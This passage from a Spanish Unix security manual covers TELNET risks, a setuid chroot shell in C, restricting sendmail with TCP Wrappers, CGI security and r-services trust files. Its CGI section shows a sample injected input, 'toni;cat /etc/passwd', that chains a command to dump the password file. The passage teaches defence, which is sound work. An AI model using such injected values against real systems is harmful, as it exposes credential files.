de la red, de forma que se crea un canal virtual de comunicaciones similar &#x2013; pero mucho m&#x00E1;s inseguro &#x2013; a
utilizar una terminal f&#x02CA;&#x0131;sicamente conectada a un servidor; la idea es sencilla: estamos accediendo
remotamente en modo texto a un equipo &#x2013; en principio potente &#x2013; igual que si estuvi&#x00E9;ramos utilizando su
consola o una de sus terminales f&#x02CA;&#x0131;sicas, lo que nos permite aprovechar toda su potencia de c&#x00E1;lculo si
necesidad de desplazarnos hasta la ubicaci&#x00F3;n de ese servidor, sino trabajando c&#x00F3;modamente desde nuestro
propio equipo.
<!--br/-->
<!--br/-->TELNET es el cl&#x00E1;sico servicio que hasta hace unos a~nos no se sol&#x02CA;&#x0131;a deshabilitar nunca: no es habitual
adquirir una potente m&#x00E1;quina corriendo Unix y permitir que s&#x00F3;lo se trabaje en ella desde su consola; lo m&#x00E1;s
normal es que este servicio est&#x00E9; disponible para que los usuarios puedan trabajar remotamente, al menos
desde un conjunto de m&#x00E1;quinas determinado. Evidentemente, reducir al m&#x02CA;&#x0131;nimo imprescindible el conjunto
de sistemas desde donde es posible la conexi&#x00F3;n es una primera medida de seguridad; no obstante, no suele
ser su&#xFB01;ciente: recordemos que TELNET no utiliza ning&#x00FA;n tipo de cifrado, por lo que todo el tr&#x00E1;&#xFB01;co entre
equipos se realiza en texto claro. Cualquier atacante con un analizador de red (o un vulgar sni&#xFB00;er) puede
capturar el login y el password utilizados en una conexi&#x00F3;n; el sni&#xFB03;ng siempre es peligroso, pero m&#x00E1;s
a&#x00FA;n en sesiones TELNET en las que transmitimos nombres de usuarios y contrase~nas: estamos
otorgando a cualquiera que lea esos datos un acceso total a la m&#x00E1;quina destino, bajo nuestra
identidad. Por tanto, es muy recomendable no utilizar TELNET para conexiones remotas,
sino sustituirlo por aplicaciones equivalentes pero que utilicen cifrado para la transmisi&#x00F3;n de
datos: SSH o SSL-Telnet son las m&#x00E1;s comunes. En estos casos necesitamos adem&#x00E1;s de la parte
cliente en nuestro equipo, la parte servidora en la m&#x00E1;quina remota escuchando en un puerto
determinado.
<!--br/-->
<!--br/-->Aparte del problema de los atacantes esnifando claves, los demonios telnetd han sido tambi&#x00E9;n una fuente
cl&#x00E1;sica de problemas de programaci&#x00F3;n (se puede encontrar un excelente repaso a algunos de ellos en el
cap&#x02CA;&#x0131;tulo 29 de <citation>[?]</citation>); b&#x00E1;sicamente, cualquier versi&#x00F3;n de este demonio que no est&#x00E9; actualizada es una potencial
fuente de problemas, por lo que conviene conseguir la &#x00FA;ltima versi&#x00F3;n de telnetd para nuestro
Unix particular, especialmente si a&#x00FA;n tenemos una versi&#x00F3;n anterior a 1997. Otros problemas,
como la posibilidad de que un atacante consiga recuperar una sesi&#x00F3;n que no ha sido cerrada
correctamente, el uso de telnet para determinar qu&#x00E9; puertos de un host est&#x00E1;n abiertos, o la utilizaci&#x00F3;n
del servicio telnet (junto a otros, como FTP) para averiguar el clon de Unix concreto (versi&#x00F3;n
de kernel incluida) que un servidor utiliza, tambi&#x00E9;n han hecho famosa la inseguridad de este
servicio.
<!--br/-->
<!--br/-->Antes hemos hablado de la con&#xFB01;guraci&#x00F3;n de un entorno restringido para usuarios FTP invitados, que
acced&#x02CA;&#x0131;an mediante su login y su contrase~na pero que no ve&#x02CA;&#x0131;an la totalidad del sistema de &#xFB01;cheros de

nuestra m&#x00E1;quina. Es posible &#x2013; aunque ni de lejos tan habitual &#x2013; hacer algo parecido con ciertos usuarios
interactivos, usuarios que conectar&#x00E1;n al sistema mediante telnet utilizando tambi&#x00E9;n su login y su password,
pero que no ver&#x00E1;n el sistema de &#xFB01;cheros completo: s&#x00F3;lo la parte que a nosotros nos interese (en
principio).
<!--br/-->
<!--br/-->Para que un usuario acceda mediante telnet a un entorno restringido con chroot() necesitamos en primer
lugar un entorno parecido al que hemos visto antes: a partir de su directorio $HOME, una serie de
subdirectorios bin/, lib/, etc/&#x2026;Dentro de este &#x00FA;ltimo existir&#x00E1; al menos un &#xFB01;chero group y otro
passwd (igual que suced&#x02CA;&#x0131;a antes, no se usan con prop&#x00F3;sitos de autenticaci&#x00F3;n, por lo que no es
necesario &#x2013; ni recomendable &#x2013; que existan claves reales en ninguno de ellos). En el directorio bin/
incluiremos los ejecutables que queremos que nuestro usuario pueda ejecutar, y en lib/ (o
usr/lib/) las librer&#x02CA;&#x0131;as que necesiten; si usamos el shellscript anterior &#x2013; de nuevo, con alguna
peque~na modi&#xFB01;caci&#x00F3;n &#x2013; para crear este entorno, en la variable $PROGS podemos de&#xFB01;nir tales
ejecutables para que autom&#x00E1;ticamente se copien junto a las librer&#x02CA;&#x0131;as necesarias en el directorio
correspondiente:

     </para><literallayout role="verbatim">
&#x00A0;PROGS=&#x0022;/bin/ls&#x00A0;/bin/sh&#x0022;
</literallayout>
<!--l. 1136--><para>Finalmente, en el archivo /etc/passwd real hemos de de&#xFB01;nir un shell para el usuario como el
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;cat&#x00A0;/home/toni/prog/shell.c
&#x00A0;#include&#x00A0;&#x003C;stdio.h&#x003E;
&#x00A0;#include&#x00A0;&#x003C;stdlib.h&#x003E;
&#x00A0;#include&#x00A0;&#x003C;unistd.h&#x003E;
&#x00A0;#include&#x00A0;&#x003C;sys/types.h&#x003E;
&#x00A0;#include&#x00A0;&#x003C;pwd.h&#x003E;
&#x00A0;
&#x00A0;#define&#x00A0;SHELL&#x00A0;&#x0022;/bin/sh&#x0022;
&#x00A0;
&#x00A0;int&#x00A0;main(){
&#x00A0;struct&#x00A0;passwd&#x00A0;*entry=(struct&#x00A0;passwd&#x00A0;*)malloc(sizeof(struct&#x00A0;passwd));
&#x00A0;char&#x00A0;*const&#x00A0;ARGS[2]={SHELL,NULL};
&#x00A0;while((entry=getpwent())-&#x003E;pw&#x005F;uid!=getuid());
&#x00A0;endpwent();
&#x00A0;if(chdir(entry-&#x003E;pw&#x005F;dir)&#x003C;0)&#x00A0;perror(&#x0022;chdir()&#x0022;);
&#x00A0;if(chroot(entry-&#x003E;pw&#x005F;dir)&#x003C;0)&#x00A0;perror(&#x0022;chroot()&#x0022;);
&#x00A0;if(setuid(getuid())&#x003C;0)&#x00A0;perror(&#x0022;setuid()&#x0022;);
&#x00A0;if(execvp(SHELL,ARGS)&#x003C;0)&#x00A0;perror(&#x0022;execvp()&#x0022;);
&#x00A0;//&#x00A0;No&#x00A0;alcanzado
&#x00A0;return(0);
&#x00A0;}
&#x00A0;luisa:~#
</literallayout>
<!--l. 1164--><para>Este c&#x00F3;digo, convenientemente compilado, ser&#x00E1; el shell real del usuario restringido; como vemos, obtiene el
directorio $HOME del mismo, hace un chroot() a &#x00E9;l, y ejecuta en este entorno el shell secundario (bin/sh,
que realmente ser&#x00E1; $HOME/bin/sh). Para que el chroot() sea correcto el programa ha de estar setuidado
bajo la identidad de root (s&#x00F3;lo el superusuario puede realizar esta llamada), con los riesgos que esto
implica; al contrario de lo que dir&#x02CA;&#x0131;a Knuth, yo s&#x00F3;lo de&#xFB01;endo que el c&#x00F3;digo anterior funciona, no que sea
correcto&#x2026;o seguro :)
<!--br/-->
<!--br/-->Si tenemos que crear un entorno como este para usuarios interactivos hemos de tener en cuenta ciertas
medidas de seguridad relativas a los ejecutables que situemos &#x2013; o que permitamos situar &#x2013; en dicho
entorno. Para empezar, hemos de evitar a toda costa los ejecutables setuidados, as&#x02CA;&#x0131; como las llamadas
mknod(), chmod() o la propia chroot(); adem&#x00E1;s, no debe ser posible obtener privilegios de administrador
dentro del entorno restringido, ya que para el root estas restricciones pierden su sentido: no
tenemos m&#x00E1;s que pensar que si un usuario con privilegios de root dentro del entorno es capaz de
generar un dispositivo que represente un disco duro, con algo tan sencillo como la utilidad
mknod, autom&#x00E1;ticamente acceder&#x00E1; a la totalidad de ese disco, olvidando ya el chroot() y la
potencial protecci&#x00F3;n que pueda ofrecernos. Algo similar ocurre con la memoria del sistema,
ciertos dispositivos f&#x02CA;&#x0131;sicos, o estructuras de datos del n&#x00FA;cleo: si esto es accesible desde el entorno
restringido, es muy probable que nuestra seguridad se vea rota tarde o temprano (m&#x00E1;s bien
temprano). Tampoco es aconsejable permitir la ejecuci&#x00F3;n de compiladores de C o de int&#x00E9;rpretes de
Perl.
<!--br/-->
<!--br/-->Como hemos dicho, este tipo de entornos es mucho menos habitual que los de FTP, aparte de bastante m&#x00E1;s
peligrosos. Una tarea tan habitual como cambiar la contrase~na no es posible &#x2013; al menos de forma trivial &#x2013;
en este entorno (aunque podr&#x02CA;&#x0131;amos modi&#xFB01;car el c&#x00F3;digo anterior para que se ofrezca al usuario esta
posibilidad antes de situarlo en el entorno restringido). &#x00BF;Y que sucede si necesitamos que el
usuario acceda no a un s&#x00F3;lo directorio, sino a dos? Las soluciones &#x2013; al menos las seguras &#x2013; no son
inmediatas.

  </para></section><!--end section--><!--l. 1198--><section 
role="section"><title><abbrev role="title-mark">14.5</abbrev><anchor 
   id="x1-22200014.5"  ></anchor>El servicio SMTP</title>
<!--l. 1199--><para>  El servicio SMTP (Simple Mail Transfer Protocol, puerto 25 TCP) se utiliza para transferir correo
electr&#x00F3;nico entre equipos remotos; estas m&#x00E1;quinas pueden ubicarse f&#x02CA;&#x0131;sicamente en la misma sala, en la misma
universidad, o en la otra parte del mundo, a miles de kil&#x00F3;metros de distancia. Este servicio suele ser
atendido por un demonio denominado sendmail, que ha sido uno de los que m&#x00E1;s problemas de seguridad ha
tenido a lo largo de la historia de Unix; y no es para menos: se trata de un software muy complejo y
potente &#x2013; incluso demasiado para las necesidades de la mayor&#x02CA;&#x0131;a de servidores &#x2013;, por lo es
inevitable que en su c&#x00F3;digo existan bugs; para hacernos una idea del grado de complejidad de
sendmail simplemente tenemos que echarle un vistazo a su &#xFB01;chero de con&#xFB01;guracion principal,
/etc/sendmail.cf. Existen incluso libros casi dedicados exclusivamente a este archivo (<citation>[?]</citation>,
<citation>[?]</citation>&#x2026;).
<!--br/-->
<!--br/-->Una medida de protecci&#x00F3;n b&#x00E1;sica para nuestro servicio SMTP, y que muchos administradores desconocen, es
la posibilidad de servir sendmail desde inetd en lugar de hacerlo como un demonio independiente, y por
tanto poder restringir el acceso al mismo mediante TCP Wrappers. En la mayor&#x02CA;&#x0131;a de organizaciones existe
un servidor de correo principal que es el encargado de recoger el mail para todas las direcciones
&#x2018;*@*.upv.es&#x2019;; el resto de equipos s&#x00F3;lo recibir&#x00E1;n correo desde este equipo &#x2013; o desde otro que sirve s&#x00F3;lo a
un subdominio, y que a su vez recibe s&#x00F3;lo desde el principal &#x2013;. Entonces, parece claro que si
nuestro sendmail s&#x00F3;lo recibe correo v&#x00E1;lido desde una m&#x00E1;quina, lo l&#x00F3;gico es con&#xFB01;gurarlo para que s&#x00F3;lo
acepte peticiones desde ella: en lugar de lanzar el demonio al arrancar el sistema, en uno de los
scripts de /etc/rc.d/ o similar, lo serviremos desde inetd. Para esto necesitamos en primer
lugar modi&#xFB01;car el script correspondiente para que sendmail no se lance como demonio en el
arranque: en lugar de invocarlo como &#x2018;sendmail -bd -q15m&#x2019; lo haremos como &#x2018;sendmail
-q15m&#x2019;. Ademas, es necesario identi&#xFB01;car el servicio en /etc/services, con una l&#x02CA;&#x0131;nea como la
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;grep&#x00A0;smtp&#x00A0;/etc/services
&#x00A0;smtp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;25/tcp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;mail
&#x00A0;luisa:~#
</literallayout>
<!--l. 1239--><para>Tras reconocer el servicio, hemos de a~nadir una l&#x02CA;&#x0131;nea en /etc/inetd.conf indicando c&#x00F3;mo se ha de
ejecutar sendmail cuando inetd reciba una petici&#x00F3;n en el puerto 25; dicha l&#x02CA;&#x0131;nea es similar a la
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;grep&#x00A0;smtp&#x00A0;/etc/inetd.conf
&#x00A0;smtp&#x00A0;&#x00A0;stream&#x00A0;&#x00A0;tcp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;nowait&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/sbin/tcpd&#x00A0;&#x00A0;sendmail&#x00A0;-bs
&#x00A0;luisa:~#
</literallayout>
<!--l. 1250--><para>Una vez realizados estos cambios podemos controlar el acceso a nuestro servicio SMTP mediante TCP
Wrappers; por ejemplo, en el caso de la Universidad Polit&#x00E9;cnica, el servidor de correo principal se denomina
vega.cc.upv.es. Para que s&#x00F3;lo esta m&#x00E1;quina nos pueda enviar correo, incluiremos una l&#x02CA;&#x0131;nea como la
siguiente en /etc/hosts.allow:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;grep&#x00A0;sendmail&#x00A0;/etc/hosts.allow
&#x00A0;sendmail:&#x00A0;vega.cc.upv.es
&#x00A0;luisa:~#
</literallayout>
<!--l. 1262--><para>El resto de sistemas no han de estar autorizados a conectar al puerto; esto incluye tambi&#x00E9;n a la m&#x00E1;quina local:
para un correcto funcionamiento de nuestro sistema de correo, ni siquiera hace falta que localhost tenga
permiso para acceder a su puerto 25. En <citation>[?]</citation> se explica c&#x00F3;mo combinar estas restricciones ofrecidas por TCP
Wrappers con un cortafuegos como TIS Firewall Toolkit; en esta obra tambi&#x00E9;n se habla con
m&#x00E1;s detalle de los problemas que puede implicar el correo electr&#x00F3;nico, y por supuesto de c&#x00F3;mo
solucionarlos.
<!--br/-->
<!--br/-->Evidentemente, esto es aplicable a sistemas que reciban correo de un &#x00FA;nico mailer; si debemos con&#xFB01;gurar el
propio mailer de la organizaci&#x00F3;n, que por lo general recibir&#x00E1; correo de un n&#x00FA;mero indeterminado de m&#x00E1;quinas,
no podemos bloquear el acceso a su sendmail de esta forma. No obstante, en este caso podemos aplicar
unas medidas de seguridad simples, como realizar una consulta inversa a DNS para asegurarnos de que
s&#x00F3;lo m&#x00E1;quinas registradas env&#x02CA;&#x0131;an correo o no permitir que nuestro sistema reenv&#x02CA;&#x0131;e correo que
no provenga de direcciones registradas bajo su dominio. Estas medidas, b&#x00E1;sicas para evitar
problemas de spam y mail bombing, son necesarias en la con&#xFB01;guraci&#x00F3;n de los sistemas de cualquier
entidad.
  </para></section><!--end section--><!--l. 1280--><section 
role="section"><title><abbrev role="title-mark">14.6</abbrev><anchor 
   id="x1-22300014.6"  ></anchor>Servidores WWW</title>
<!--l. 1281--><para>  Hoy en d&#x02CA;&#x0131;a las conexiones a servidores web son sin duda las m&#x00E1;s extendidas entre usuarios de Internet,
hasta el punto de que muchas personas piensan que este servicio (HTTP, puerto 80 TCP) es el &#x00FA;nico que
existe en la red &#x2013; junto al IRC &#x2013;. Lo que en un principio se dise~n&#x00F3; para que unos cuantos f&#x02CA;&#x0131;sicos
intercambiaran y consultaran art&#x02CA;&#x0131;culos f&#x00E1;cilmente, en la actualidad mueve a diario millones de d&#x00F3;lares y es
uno de los pilares fundamentales de cualquier empresa: es por tanto un objetivo muy atractivo para
cualquier pirata.
<!--br/-->
<!--br/-->Los problemas de seguridad relacionados con el protocolo HTTP se dividen en tres grandes grupos en
funci&#x00F3;n de los datos a los que pueden afectar (<citation>[?]</citation>):
     </para><itemizedlist>
     <listitem>
     <!--l. 1294--><para>Seguridad en el servidor.
     <!--br/-->Es necesario garantizar que la informaci&#x00F3;n almacenada en la m&#x00E1;quina servidora no pueda ser
     modi&#xFB01;cada sin autorizaci&#x00F3;n, que permanezca disponible y que s&#x00F3;lo pueda ser accedida por los
     usuarios a los que les est&#x00E9; leg&#x02CA;&#x0131;timamente permitido.
     </para></listitem>
     <listitem>
     <!--l. 1299--><para>Seguridad en la red.
     <!--br/-->Cuando  un  usuario  conecta  a  un  servidor  web se  produce  un  intercambio  de  informaci&#x00F3;n
     entre ambos; es vital garantizar que los datos que recibe el cliente desde el servidor sean los
     mismos que se est&#x00E1;n enviando (esto es, que no sufran modi&#xFB01;caciones de terceros), y tambi&#x00E9;n
     garantizar que la informaci&#x00F3;n que el usuario env&#x02CA;&#x0131;a hacia el servidor no sea capturada, destruida
     o modi&#xFB01;cada por un atacante. Esto es especialmente importante si la informaci&#x00F3;n en tr&#x00E1;nsito es
     secreta, como en el caso de los passwords que el usuario teclea para autenticarse en el servidor,
     o en el comercio electr&#x00F3;nico y el intercambio de n&#x00FA;meros de tarjetas de cr&#x00E9;dito.
     </para></listitem>
     <listitem>

     <!--l. 1309--><para>Seguridad en el cliente.
     <!--br/-->Por &#x00FA;ltimo es necesario garantizar al usuario que lo que descarga de un servidor no va a
     perjudicar a la seguridad de su equipo; sin llegar a extremos de applets maliciosos o programas
     con virus, si simplemente el navegador del usuario &#x2018;se cuelga&#x2019; al acceder al visitar las p&#x00E1;ginas
     de una organizaci&#x00F3;n, seguramente esa persona dejar&#x00E1; de visitarlas, con la consecuente p&#x00E9;rdida de
     imagen &#x2013; y posiblemente de un futuro cliente &#x2013; para esa entidad.</para></listitem></itemizedlist>
<!--l. 1318--><para>Asegurar el servidor implica &#x2013; aparte de las medidas habituales para cualquier m&#x00E1;quina Unix &#x2013; medidas
excepcionales dedicadas al demonio servidor de web y su entorno de trabajo; estas medidas son propias
para cada programa servidor, por lo que aqu&#x02CA;&#x0131; no entraremos en detalles concretos sobre cada uno de ellos.
No obstante, y sea cual sea el servidor utilizado (Apache, NCSA, Netscape&#x2026;), es necesario seguir un
consejo b&#x00E1;sico: minimizar el n&#x00FA;mero de usuarios en la m&#x00E1;quina y minimizar el n&#x00FA;mero de servicios ofrecidos en
ella; aunque lo normal es que una m&#x00E1;quina dedicada a cualquier tarea con decenas &#x2013; o con miles &#x2013; de
usuarios sea tambi&#x00E9;n el servidor web, es recomendable que dicho servidor sea un equipo dedicado a esa
tarea.
<!--br/-->
<!--br/-->Los problemas relacionados con servidores web suelen proceder de errores de programaci&#x00F3;n en los CGIs
ubicados en el servidor. Un CGI (Common Gateway Interface) es un c&#x00F3;digo capaz de comunicarse con
aplicaciones del servidor, de forma que desde una p&#x00E1;gina se invoque a dichas aplicaciones pas&#x00E1;ndoles
argumentos y el resultado se muestre en el navegador de un cliente; cuando rellenamos un formulario,
vemos una imagen sensible, o simplemente incrementamos el contador de cierta p&#x00E1;gina, estamos utilizando
CGIs. Esta capacidad del CGI para comunicarse con el resto del sistema que alberga las p&#x00E1;ginas es lo que le
otorga su potencia, pero tambi&#x00E9;n lo que causa mayores problemas de seguridad: un fallo en estos programas
suele permitir a cualquier visitante de las p&#x00E1;ginas ejecutar &#x00F3;rdenes en el sistema. Los errores m&#x00E1;s
habituales en un CGI provienen de los datos recibidos desde el navegador del cliente: un simple
formulario, en el que el visitante rellena ciertos campos, puede ser una puerta de acceso a
nuestro sistema; es necesario comprobar la validez de todos y cada uno de los datos le&#x02CA;&#x0131;dos antes
de que sean procesados. Por ejemplo, imaginemos un CGI que pida un nombre de usuario
por teclado y a continuaci&#x00F3;n ejecute un finger contra ese nombre de usuario y muestre el
resultado en el navegador; &#x00BF;que suceder&#x02CA;&#x0131;a si el visitante introduce como nombre de usuario
&#x2018;toni;cat /etc/passwd&#x2019;? Es posible que se ejecute el finger a toni, pero a continuaci&#x00F3;n se
vuelque el &#xFB01;chero de contrase~nas simplemente porque no se ha tenido la precauci&#x00F3;n de ignorar los
caracteres especiales para el shell (recordemos que un &#x2018;;&#x2019; en Unix separa varias &#x00F3;rdenes en una
misma l&#x02CA;&#x0131;nea); este ejemplo, que hoy en d&#x02CA;&#x0131;a parece absurdo, ha estado presente en algunos
servidores durante mucho tiempo. Cualquier CGI es susceptible de presentar problemas de
seguridad sin importar el lenguaje en que se haya escrito (<citation>[?]</citation>); por tanto, es muy importante
preocuparse de mantener actualizado el &#x00E1;rbol de CGIs (no copiarlo completamente al actualizar
la versi&#x00F3;n de demonio), e incluso revisar los programas m&#x00E1;s importantes en busca de posibles
bugs. Otra medida de seguridad b&#x00E1;sica es ejecutar el demonio servidor bajo la identidad de
un usuario con privilegios m&#x02CA;&#x0131;nimos para que todo funcione correctamente, pero nunca como
root; generalmente, el usuario nobody suele ser m&#x00E1;s que su&#xFB01;ciente: recordemos que los CGIs se
ejecutan bajo la identidad del usuario propietario del demonio, por lo que si ese propietario es
el administrador un potencial atacante podr&#x02CA;&#x0131;a ejecutar cualquier aplicaci&#x00F3;n como root del
sistema.
<!--br/-->
<!--br/-->Para garantizar la seguridad de los datos que circulan entre un cliente y el servidor es casi obligatorio
cifrar dichos datos (otras medidas, como asegurar f&#x02CA;&#x0131;sicamente la red, suelen ser impracticables) mediante
SSL (Secure Socket Layer), un protocolo desarrollado por Netscape Communications para cifrar
informaci&#x00F3;n al enviarla por la red y descifrarla antes de ser utilizada en el cliente; en la actualidad, se est&#x00E1;
viendo relegado a un segundo plano a causa de los certi&#xFB01;cados digitales, aunque sigue siendo una excelente
opci&#x00F3;n para administraci&#x00F3;n remota y para transmitir informaci&#x00F3;n con&#xFB01;dencial en redes de prop&#x00F3;sito
general.
<!--br/-->
<!--br/-->En &#x00FA;ltimo lugar es necesario hablar de la seguridad desde el punto de vista del cliente que visita p&#x00E1;ginas
web; para el usuario, un servidor es seguro si protege la informaci&#x00F3;n que recibe y env&#x02CA;&#x0131;a hacia &#x00E9;l,
manteniendo su privacidad, y si no conduce al usuario a descargar programas maliciosos &#x2013;
generalmente virus &#x2013; en su equipo; si sucede lo contrario, la compa~n&#x02CA;&#x0131;a responsable de las p&#x00E1;ginas se

enfrenta a una importante p&#x00E9;rdida de imagen &#x2013; aparte de posibles problemas judiciales &#x2013; de
cara a sus usuarios: simplemente imaginemos que salta a los medios un fallo de seguridad en
la versi&#x00F3;n electr&#x00F3;nica de cierto banco; ser&#x00E1; dif&#x02CA;&#x0131;cil que todos sus usuarios sigan manteniendo la
su&#xFB01;ciente con&#xFB01;anza en &#x00E9;l como para guardar all&#x02CA;&#x0131; su dinero. Tambi&#x00E9;n es necesario hablar de los
applets hostiles &#x2013; o simplemente de los mal dise~nados &#x2013; que en muchas ocasiones llegan a
detener todas las copias del navegador en memoria; aunque sus implicaciones de seguridad no
suelen ser muy graves, la p&#x00E9;rdida de imagen de la compa~n&#x02CA;&#x0131;a es tambi&#x00E9;n considerable en estos
casos.
<!--br/-->
<!--br/-->En muy pocas m&#x00E1;quinas se pueden permitir el lujo de deshabilitar este servicio, ya que como hemos dicho
es de los m&#x00E1;s utilizados actualmente; no obstante, por alguna extra~na raz&#x00F3;n &#x2013; personalmente no la llego a
comprender &#x2013; en algunos clones de Unix (por ejemplo, ciertas variantes de Linux) el servicio HTTP est&#x00E1;
activado por defecto a&#x00FA;n a sabiendas de que muchos de los usuarios de este sistema van a utilizarlo en su
casa o como estaci&#x00F3;n de trabajo independiente, donde evidentemente no es habitual &#x2013; ni necesario en la
mayor&#x02CA;&#x0131;a de ocasiones &#x2013; ofrecerlo. Por supuesto, en estos casos es importante detener el demonio httpd y
evitar que se vuelva a iniciar con el arranque de la m&#x00E1;quina, modi&#xFB01;cando el script correspondiente.
Siempre hemos de recordar que hemos de ofrecer s&#x00F3;lo los servicios imprescindibles en cada
sistema.
  </para></section><!--end section--><!--l. 1402--><section 
role="section"><title><abbrev role="title-mark">14.7</abbrev><anchor 
   id="x1-22400014.7"  ></anchor>Los servicios r-<informalequation><graphic 
fileref="unixsec295x.gif"></graphic></informalequation></title>
<!--l. 1403--><para>  Los servicios r-* de Unix BSD (aparecieron inicialmente en la versi&#x00F3;n 4.2 de esta variante de
Unix) son herramientas con una parte cliente y una servidora que permiten la conexi&#x00F3;n remota
entre m&#x00E1;quinas, principalmente para servicios de terminal remota y transferencia de &#xFB01;cheros.
Las herramientas clientes son rsh, rlogin y rcp, mientras que las servidoras son demonios
como rexecd, rshd o rlogind (en algunas versiones de Unix, con in. delante del nombre
del demonio); rdist y rdistd, otro par de estas herramientas r-*, no los vamos a tratar
aqu&#x02CA;&#x0131;.
<!--br/-->
<!--br/-->rlogin (puerto 513, TCP) se utiliza como terminal virtual de un sistema Unix , de una forma muy
parecida a TELNET. rsh (puerto 514, TCP) es utilizado para ejecutar comandos en una m&#x00E1;quina
remota sin necesidad de acceder a ella, y rcp (v&#x02CA;&#x0131;a rsh) para copiar &#xFB01;cheros entre diferentes
m&#x00E1;quinas:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;rlogin&#x00A0;-l&#x00A0;toni&#x00A0;rosita
&#x00A0;
&#x00A0;Overflow&#x00A0;on&#x00A0;/dev/null,&#x00A0;please&#x00A0;empty&#x00A0;the&#x00A0;bit&#x00A0;bucket.
&#x00A0;
&#x00A0;rosita:~$&#x00A0;exit
&#x00A0;logout
&#x00A0;rlogin:&#x00A0;connection&#x00A0;closed.
&#x00A0;luisa:~#&#x00A0;rsh&#x00A0;-l&#x00A0;toni&#x00A0;rosita&#x00A0;id
&#x00A0;uid=1000(toni)&#x00A0;gid=100(users)&#x00A0;groups=100(users)
&#x00A0;luisa:~#&#x00A0;rcp&#x00A0;prueba.tex&#x00A0;toni@rosita:/tmp/
&#x00A0;luisa:~#
</literallayout>
<!--l. 1432--><para>Como vemos, la &#x00FA;ltima orden no ha solicitado ninguna contrase~na; ha copiado el &#xFB01;chero local &#x2018;prueba.tex&#x2019;
en el directorio /tmp/ del sistema remoto, bajo la identidad del usuario toni. A continuaci&#x00F3;n veremos por
qu&#x00E9; no se ha pedido clave para realizar esta acci&#x00F3;n.
<!--br/-->
<!--br/-->Estos servicios pretenden evitar el tr&#x00E1;nsito de contrase~nas por la red, ya que este movimiento de claves
implica molestias a los usuarios y tambi&#x00E9;n problemas de seguridad; para conseguirlo, entran en
juego lo que los dise~nadores del sistema de red de Unix BSD denominaron &#x2018;m&#x00E1;quinas &#xFB01;ables&#x2019; y
&#x2018;usuarios &#xFB01;ables&#x2019;: cualquier usuario, puede hacer uso de recursos de una m&#x00E1;quina remota sin
necesidad de una clave si su conexi&#x00F3;n proviene de una m&#x00E1;quina &#xFB01;able o su nombre de usuario es
&#xFB01;able.
<!--br/-->
<!--br/-->Una m&#x00E1;quina se puede considerar &#xFB01;able de dos formas: o bien su nombre se encuentra en
<!--br/-->/etc/hosts.equiv, o bien se encuentra en un &#xFB01;chero denominado .rhosts y situado en el
$HOME de alg&#x00FA;n usuario. Si estamos en el primer caso, cualquier usuario (excepto el root)
del sistema remoto &#x2013; y &#xFB01;able &#x2013; puede hacer acceder a nuestro equipo bajo el mismo login
que tiene en el primero, sin necesidad de claves. En el segundo caso, utilizando los &#xFB01;cheros
.rhosts, cualquier usuario del sistema remoto podr&#x00E1; conectar al nuestro pero s&#x00F3;lo bajo el nombre
de usuario en cuyo $HOME se encuentra el archivo. Por ejemplo, imaginemos la siguiente
con&#xFB01;guraci&#x00F3;n:

     </para><literallayout role="verbatim">
&#x00A0;rosita:~#&#x00A0;cat&#x00A0;/etc/hosts.equiv
&#x00A0;luisa
&#x00A0;rosita:~#&#x00A0;cat&#x00A0;~toni/.rhosts
&#x00A0;anita
&#x00A0;rosita:~#
</literallayout>
<!--l. 1463--><para>En esta situaci&#x00F3;n, cualquier usuario de luisa puede acceder a rosita si su nombre de usuario es el mismo;
adem&#x00E1;s, el usuario toni de anita puede tambi&#x00E9;n conectar a rosita sin necesidad de ninguna
contrase~na:

     </para><literallayout role="verbatim">
&#x00A0;anita:~$&#x00A0;rlogin&#x00A0;rosita
&#x00A0;
&#x00A0;In&#x00A0;the&#x00A0;long&#x00A0;run,&#x00A0;every&#x00A0;program&#x00A0;becomes&#x00A0;rococo,&#x00A0;and&#x00A0;then&#x00A0;rubble.
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;--&#x00A0;Alan&#x00A0;Perlis
&#x00A0;
&#x00A0;rosita:~$&#x00A0;id
&#x00A0;uid=1000(toni)&#x00A0;gid=100(users)&#x00A0;groups=100(users)
&#x00A0;rosita:~$
</literallayout>
<!--l. 1479--><para>Aparte de m&#x00E1;quinas &#xFB01;ables hab&#x02CA;&#x0131;amos hablado de usuarios &#xFB01;ables; la idea es la misma que antes, pero
aplic&#x00E1;ndola ahora a nombres de usuario junto a (o en lugar de) nombres de m&#x00E1;quina. Podemos indicar estos
nombres tanto en /etc/hosts.equiv como en los archivos .rhosts; no obstante, la primera opci&#x00F3;n no es
recomendable, ya que estar&#x02CA;&#x0131;amos permitiendo al usuario &#xFB01;able del sistema remoto acceder sin contrase~na a
cualquier cuenta de nuestra m&#x00E1;quina. De esta forma, si deseamos crear usuarios &#xFB01;ables de sistemas
remotos, es necesario hacerlo en los archivos .rhosts. Por ejemplo, imaginemos que el usuario toni
de nuestra m&#x00E1;quina tiene un nombre de usuario distinto (antonio) en un sistema remoto, y
desea establecer una relaci&#x00F3;n de con&#xFB01;anza; para ello crear&#x00E1; en su $HOME el siguiente archivo
.rhosts:

     </para><literallayout role="verbatim">
&#x00A0;rosita:~#&#x00A0;cat&#x00A0;~toni/.rhosts
&#x00A0;amparo&#x00A0;antonio
&#x00A0;rosita:~#
</literallayout>
<!--l. 1499--><para>Entonces, desde la m&#x00E1;quina amparo el usuario antonio podr&#x00E1; acceder a la cuenta de toni en nuestro sistema
sin utilizar contrase~nas:

     </para><literallayout role="verbatim">
&#x00A0;amparo:~$&#x00A0;id
&#x00A0;uid=102(antonio)&#x00A0;gid=10(staff)
